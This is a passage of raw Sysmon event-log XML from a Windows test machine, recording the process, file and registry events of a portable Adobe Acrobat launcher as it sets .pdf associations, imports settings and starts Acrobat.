+TargetObject: HKU\S-1-5-21-3589201120-3083077123-1171929968-1001\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.pdf</Message><Level>Information</Level><Task>Registry object added or deleted (rule: RegistryEvent)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>12</EventID><Version>2</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:37.941506400Z'/><EventRecordID>37364</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='EventType'>CreateKey</Data><Data Name='UtcTime'>2019-11-14 09:30:37.890</Data><Data Name='ProcessGuid'>{49926e27-fe01-5dcc-0000-0010f9490400}</Data><Data Name='ProcessId'>3468</Data><Data Name='Image'>C:\Windows\Explorer.EXE</Data><Data Name='TargetObject'>HKU\S-1-5-21-3589201120-3083077123-1171929968-1001\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.pdf</Data></EventData><RenderingInfo Culture='en-US'><Message>Registry object added or deleted:
+RuleName: 
+EventType: CreateKey
+UtcTime: 2019-11-14 09:30:37.890
+ProcessGuid: {49926e27-fe01-5dcc-0000-0010f9490400}
+ProcessId: 3468
+Image: C:\Windows\Explorer.EXE
+TargetObject: HKU\S-1-5-21-3589201120-3083077123-1171929968-1001\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.pdf</Message><Level>Information</Level><Task>Registry object added or deleted (rule: RegistryEvent)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>12</EventID><Version>2</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:37.941244200Z'/><EventRecordID>37363</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='EventType'>CreateKey</Data><Data Name='UtcTime'>2019-11-14 09:30:37.890</Data><Data Name='ProcessGuid'>{49926e27-fe01-5dcc-0000-0010f9490400}</Data><Data Name='ProcessId'>3468</Data><Data Name='Image'>C:\Windows\Explorer.EXE</Data><Data Name='TargetObject'>HKU\S-1-5-21-3589201120-3083077123-1171929968-1001\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.pdf</Data></EventData><RenderingInfo Culture='en-US'><Message>Registry object added or deleted:
+RuleName: 
+EventType: CreateKey
+UtcTime: 2019-11-14 09:30:37.890
+ProcessGuid: {49926e27-fe01-5dcc-0000-0010f9490400}
+ProcessId: 3468
+Image: C:\Windows\Explorer.EXE
+TargetObject: HKU\S-1-5-21-3589201120-3083077123-1171929968-1001\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.pdf</Message><Level>Information</Level><Task>Registry object added or deleted (rule: RegistryEvent)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:37.589221000Z'/><EventRecordID>37362</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:30:37.549</Data><Data Name='ProcessGuid'>{49926e27-1ebd-5dcd-0000-0010d3d32801}</Data><Data Name='ProcessId'>1288</Data><Data Name='Image'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\Acrobat.exe</Data><Data Name='FileVersion'>15.10.20056.167417</Data><Data Name='Description'>Adobe Acrobat DC </Data><Data Name='Product'>Adobe Acrobat DC</Data><Data Name='Company'>Adobe Systems Incorporated</Data><Data Name='OriginalFileName'>Acrobat.exe</Data><Data Name='CommandLine'>"C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\Acrobat.exe" </Data><Data Name='CurrentDirectory'>C:\Windows\system32\</Data><Data Name='User'>WINDEV1910EVAL\User</Data><Data Name='LogonGuid'>{49926e27-fdfa-5dcc-0000-0020e1530300}</Data><Data Name='LogonId'>0x353e1</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=65A3830405A8AFD9CDFA9AB4DC0455E9,SHA256=018E34CD2A7F95A1BF69E85EA12B57E0AFD4DC3D736722462E43FEE062B3A2E1</Data><Data Name='ParentProcessGuid'>{49926e27-fe01-5dcc-0000-0010f9490400}</Data><Data Name='ParentProcessId'>3468</Data><Data Name='ParentImage'>C:\Windows\explorer.exe</Data><Data Name='ParentCommandLine'>C:\Windows\Explorer.EXE</Data></EventData><RenderingInfo Culture='en-US'><Message>Process Create:
+RuleName: 
+UtcTime: 2019-11-14 09:30:37.549
+ProcessGuid: {49926e27-1ebd-5dcd-0000-0010d3d32801}
+ProcessId: 1288
+Image: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\Acrobat.exe
+FileVersion: 15.10.20056.167417
+Description: Adobe Acrobat DC 
+Product: Adobe Acrobat DC
+Company: Adobe Systems Incorporated
+OriginalFileName: Acrobat.exe
+CommandLine: "C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\Acrobat.exe" 
+CurrentDirectory: C:\Windows\system32\
+User: WINDEV1910EVAL\User
+LogonGuid: {49926e27-fdfa-5dcc-0000-0020e1530300}
+LogonId: 0x353E1
+TerminalSessionId: 1
+IntegrityLevel: Medium
+Hashes: MD5=65A3830405A8AFD9CDFA9AB4DC0455E9,SHA256=018E34CD2A7F95A1BF69E85EA12B57E0AFD4DC3D736722462E43FEE062B3A2E1
+ParentProcessGuid: {49926e27-fe01-5dcc-0000-0010f9490400}
+ParentProcessId: 3468
+ParentImage: C:\Windows\explorer.exe
+ParentCommandLine: C:\Windows\Explorer.EXE</Message><Level>Information</Level><Task>Process Create (rule: ProcessCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>13</EventID><Version>2</Version><Level>4</Level><Task>13</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:37.116732700Z'/><EventRecordID>37361</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='EventType'>SetValue</Data><Data Name='UtcTime'>2019-11-14 09:30:36.921</Data><Data Name='ProcessGuid'>{49926e27-1eba-5dcd-0000-0010c2722801}</Data><Data Name='ProcessId'>6304</Data><Data Name='Image'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe</Data><Data Name='TargetObject'>HKCR\Acrobat.Document.DC\shell\open\command\(Default)</Data><Data Name='Details'>"C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\Acrobat.exe" "%%1"</Data></EventData><RenderingInfo Culture='en-US'><Message>Registry value set:
+RuleName: 
+EventType: SetValue
+UtcTime: 2019-11-14 09:30:36.921
+ProcessGuid: {49926e27-1eba-5dcd-0000-0010c2722801}
+ProcessId: 6304
+Image: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe
+TargetObject: HKCR\Acrobat.Document.DC\shell\open\command\(Default)
+Details: "C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\App\Acrobat\Acrobat.exe" "Incorrect function."</Message><Level>Information</Level><Task>Registry value set (rule: RegistryEvent)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:35.934773800Z'/><EventRecordID>37360</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:30:35.923</Data><Data Name='ProcessGuid'>{49926e27-1ebb-5dcd-0000-0010b2a02801}</Data><Data Name='ProcessId'>6264</Data><Data Name='Image'>C:\Windows\SysWOW64\regedit.exe</Data><Data Name='FileVersion'>10.0.18362.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Registry Editor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>REGEDIT.EXE</Data><Data Name='CommandLine'>"C:\Windows\system32\regedit.exe" /s "C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\Data\settings\Acrobat.reg"</Data><Data Name='CurrentDirectory'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\</Data><Data Name='User'>WINDEV1910EVAL\User</Data><Data Name='LogonGuid'>{49926e27-fdfa-5dcc-0000-0020b3530300}</Data><Data Name='LogonId'>0x353b3</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=01CE651BAE4DB16618DF8FF1A517E6E4,SHA256=D5DE45DECFD0FA08AC12F5725DFC7E5AF1E3ED0325559101990FDCF02C439441</Data><Data Name='ParentProcessGuid'>{49926e27-1eba-5dcd-0000-0010c2722801}</Data><Data Name='ParentProcessId'>6304</Data><Data Name='ParentImage'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe</Data><Data Name='ParentCommandLine'>"C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe" /UAC:3207B0 /NCRC </Data></EventData><RenderingInfo Culture='en-US'><Message>Process Create:
+RuleName: 
+UtcTime: 2019-11-14 09:30:35.923
+ProcessGuid: {49926e27-1ebb-5dcd-0000-0010b2a02801}
+ProcessId: 6264
+Image: C:\Windows\SysWOW64\regedit.exe
+FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
+Description: Registry Editor
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: REGEDIT.EXE
+CommandLine: "C:\Windows\system32\regedit.exe" /s "C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\Data\settings\Acrobat.reg"
+CurrentDirectory: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\
+User: WINDEV1910EVAL\User
+LogonGuid: {49926e27-fdfa-5dcc-0000-0020b3530300}
+LogonId: 0x353B3
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=01CE651BAE4DB16618DF8FF1A517E6E4,SHA256=D5DE45DECFD0FA08AC12F5725DFC7E5AF1E3ED0325559101990FDCF02C439441
+ParentProcessGuid: {49926e27-1eba-5dcd-0000-0010c2722801}
+ParentProcessId: 6304
+ParentImage: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe
+ParentCommandLine: "C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe" /UAC:3207B0 /NCRC </Message><Level>Information</Level><Task>Process Create (rule: ProcessCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>12</EventID><Version>2</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:35.919765200Z'/><EventRecordID>37359</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='EventType'>DeleteKey</Data><Data Name='UtcTime'>2019-11-14 09:30:35.905</Data><Data Name='ProcessGuid'>{49926e27-1eba-5dcd-0000-0010c2722801}</Data><Data Name='ProcessId'>6304</Data><Data Name='Image'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe</Data><Data Name='TargetObject'>HKU\S-1-5-21-3589201120-3083077123-1171929968-1001\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.pdf</Data></EventData><RenderingInfo Culture='en-US'><Message>Registry object added or deleted:
+RuleName: 
+EventType: DeleteKey
+UtcTime: 2019-11-14 09:30:35.905
+ProcessGuid: {49926e27-1eba-5dcd-0000-0010c2722801}
+ProcessId: 6304
+Image: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe
+TargetObject: HKU\S-1-5-21-3589201120-3083077123-1171929968-1001\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.pdf</Message><Level>Information</Level><Task>Registry object added or deleted (rule: RegistryEvent)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>13</EventID><Version>2</Version><Level>4</Level><Task>13</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:35.914265800Z'/><EventRecordID>37358</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='EventType'>SetValue</Data><Data Name='UtcTime'>2019-11-14 09:30:35.905</Data><Data Name='ProcessGuid'>{49926e27-1eba-5dcd-0000-0010c2722801}</Data><Data Name='ProcessId'>6304</Data><Data Name='Image'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe</Data><Data Name='TargetObject'>HKU\S-1-5-21-3589201120-3083077123-1171929968-1001\Software\PortableApps.com\Keys\HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.pdf\OpenWithList\a</Data><Data Name='Details'>AcrobatPortable.exe</Data></EventData><RenderingInfo Culture='en-US'><Message>Registry value set:
+RuleName: 
+EventType: SetValue
+UtcTime: 2019-11-14 09:30:35.905
+ProcessGuid: {49926e27-1eba-5dcd-0000-0010c2722801}
+ProcessId: 6304
+Image: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe
+TargetObject: HKU\S-1-5-21-3589201120-3083077123-1171929968-1001\Software\PortableApps.com\Keys\HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.pdf\OpenWithList\a
+Details: AcrobatPortable.exe</Message><Level>Information</Level><Task>Registry value set (rule: RegistryEvent)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>12</EventID><Version>2</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:35.913942100Z'/><EventRecordID>37357</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='EventType'>CreateKey</Data><Data Name='UtcTime'>2019-11-14 09:30:35.905</Data><Data Name='ProcessGuid'>{49926e27-1eba-5dcd-0000-0010c2722801}</Data><Data Name='ProcessId'>6304</Data><Data Name='Image'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe</Data><Data Name='TargetObject'>HKU\S-1-5-21-3589201120-3083077123-1171929968-1001\Software\PortableApps.com\Keys\HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.pdf</Data></EventData><RenderingInfo Culture='en-US'><Message>Registry object added or deleted:
+RuleName: 
+EventType: CreateKey
+UtcTime: 2019-11-14 09:30:35.905
+ProcessGuid: {49926e27-1eba-5dcd-0000-0010c2722801}
+ProcessId: 6304
+Image: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe
+TargetObject: HKU\S-1-5-21-3589201120-3083077123-1171929968-1001\Software\PortableApps.com\Keys\HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.pdf</Message><Level>Information</Level><Task>Registry object added or deleted (rule: RegistryEvent)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:35.847862700Z'/><EventRecordID>37356</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:30:35.843</Data><Data Name='ProcessGuid'>{49926e27-1ebb-5dcd-0000-001050982801}</Data><Data Name='ProcessId'>3748</Data><Data Name='Image'>C:\Users\User\AppData\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\junction.exe</Data></EventData><RenderingInfo Culture='en-US'><Message>Process terminated:
+RuleName: 
+UtcTime: 2019-11-14 09:30:35.843
+ProcessGuid: {49926e27-1ebb-5dcd-0000-001050982801}
+ProcessId: 3748
+Image: C:\Users\User\AppData\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\junction.exe</Message><Level>Information</Level><Task>Process terminated (rule: ProcessTerminate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:35.779249100Z'/><EventRecordID>37355</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:30:35.753</Data><Data Name='ProcessGuid'>{49926e27-1ebb-5dcd-0000-001050982801}</Data><Data Name='ProcessId'>3748</Data><Data Name='Image'>C:\Users\User\AppData\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\junction.exe</Data><Data Name='FileVersion'>1.06</Data><Data Name='Description'>junction</Data><Data Name='Product'>Sysinternals Junction</Data><Data Name='Company'>Sysinternals - www.sysinternals.com</Data><Data Name='OriginalFileName'>junction.exe</Data><Data Name='CommandLine'>"C:\Users\User\AppData\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\junction.exe" -accepteula -q "C:\Program Files (x86)\Common Files\Adobe" "C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\Data\CommonFiles"</Data><Data Name='CurrentDirectory'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\</Data><Data Name='User'>WINDEV1910EVAL\User</Data><Data Name='LogonGuid'>{49926e27-fdfa-5dcc-0000-0020b3530300}</Data><Data Name='LogonId'>0x353b3</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=F1F23D4DF41C5DA5444C97781FF2CAB7,SHA256=343C0764DF76F631702DFD15C52004E65792A1E033F5AE2C8925F35301364A64</Data><Data Name='ParentProcessGuid'>{49926e27-1eba-5dcd-0000-0010c2722801}</Data><Data Name='ParentProcessId'>6304</Data><Data Name='ParentImage'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe</Data><Data Name='ParentCommandLine'>"C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe" /UAC:3207B0 /NCRC </Data></EventData><RenderingInfo Culture='en-US'><Message>Process Create:
+RuleName: 
+UtcTime: 2019-11-14 09:30:35.753
+ProcessGuid: {49926e27-1ebb-5dcd-0000-001050982801}
+ProcessId: 3748
+Image: C:\Users\User\AppData\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\junction.exe
+FileVersion: 1.06
+Description: junction
+Product: Sysinternals Junction
+Company: Sysinternals - www.sysinternals.com
+OriginalFileName: junction.exe
+CommandLine: "C:\Users\User\AppData\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\junction.exe" -accepteula -q "C:\Program Files (x86)\Common Files\Adobe" "C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\Data\CommonFiles"
+CurrentDirectory: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\
+User: WINDEV1910EVAL\User
+LogonGuid: {49926e27-fdfa-5dcc-0000-0020b3530300}
+LogonId: 0x353B3
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=F1F23D4DF41C5DA5444C97781FF2CAB7,SHA256=343C0764DF76F631702DFD15C52004E65792A1E033F5AE2C8925F35301364A64
+ParentProcessGuid: {49926e27-1eba-5dcd-0000-0010c2722801}
+ParentProcessId: 6304
+ParentImage: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe
+ParentCommandLine: "C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe" /UAC:3207B0 /NCRC </Message><Level>Information</Level><Task>Process Create (rule: ProcessCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>2</EventID><Version>4</Version><Level>4</Level><Task>2</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:35.577666600Z'/><EventRecordID>37354</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:30:35.562</Data><Data Name='ProcessGuid'>{49926e27-1eba-5dcd-0000-0010c2722801}</Data><Data Name='ProcessId'>6304</Data><Data Name='Image'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe</Data><Data Name='TargetFilename'>C:\Users\User\AppData\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\junction.exe</Data><Data Name='CreationUtcTime'>2015-04-05 16:46:16.000</Data><Data Name='PreviousCreationUtcTime'>2019-11-14 09:30:35.562</Data></EventData><RenderingInfo Culture='en-US'><Message>File creation time changed:
+RuleName: 
+UtcTime: 2019-11-14 09:30:35.562
+ProcessGuid: {49926e27-1eba-5dcd-0000-0010c2722801}
+ProcessId: 6304
+Image: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe
+TargetFilename: C:\Users\User\AppData\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\junction.exe
+CreationUtcTime: 2015-04-05 16:46:16.000
+PreviousCreationUtcTime: 2019-11-14 09:30:35.562</Message><Level>Information</Level><Task>File creation time changed (rule: FileCreateTime)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:35.577607200Z'/><EventRecordID>37353</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:30:35.562</Data><Data Name='ProcessGuid'>{49926e27-1eba-5dcd-0000-0010c2722801}</Data><Data Name='ProcessId'>6304</Data><Data Name='Image'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe</Data><Data Name='TargetFilename'>C:\Users\User\AppData\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\junction.exe</Data><Data Name='CreationUtcTime'>2019-11-14 09:30:35.562</Data></EventData><RenderingInfo Culture='en-US'><Message>File created:
+RuleName: 
+UtcTime: 2019-11-14 09:30:35.562
+ProcessGuid: {49926e27-1eba-5dcd-0000-0010c2722801}
+ProcessId: 6304
+Image: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe
+TargetFilename: C:\Users\User\AppData\Local\Temp\3644dca_12a8VcA_0F09Bcc0.tmp\junction.exe
+CreationUtcTime: 2019-11-14 09:30:35.562</Message><Level>Information</Level><Task>File created (rule: FileCreate)</Task><Opcode>Info</Opcode><Channel></Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2019-11-14T09:30:35.527840900Z'/><EventRecordID>37352</EventRecordID><Correlation/><Execution ProcessID='2264' ThreadID='3080'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WinDev1910Eval</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-11-14 09:30:35.515</Data><Data Name='ProcessGuid'>{49926e27-1eba-5dcd-0000-0010c2722801}</Data><Data Name='ProcessId'>6304</Data><Data Name='Image'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe</Data><Data Name='TargetFilename'>C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\Data\Plug-Ins.lnk</Data><Data Name='CreationUtcTime'>2019-11-14 08:00:12.852</Data></EventData><RenderingInfo Culture='en-US'><Message>File created:
+RuleName: 
+UtcTime: 2019-11-14 09:30:35.515
+ProcessGuid: {49926e27-1eba-5dcd-0000-0010c2722801}
+ProcessId: 6304
+Image: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\AcrobatPortable.exe
+TargetFilename: C:\Users\User\Downloads\AcrobatPortable\AcrobatPortable\Data\Plug-Ins.lnk
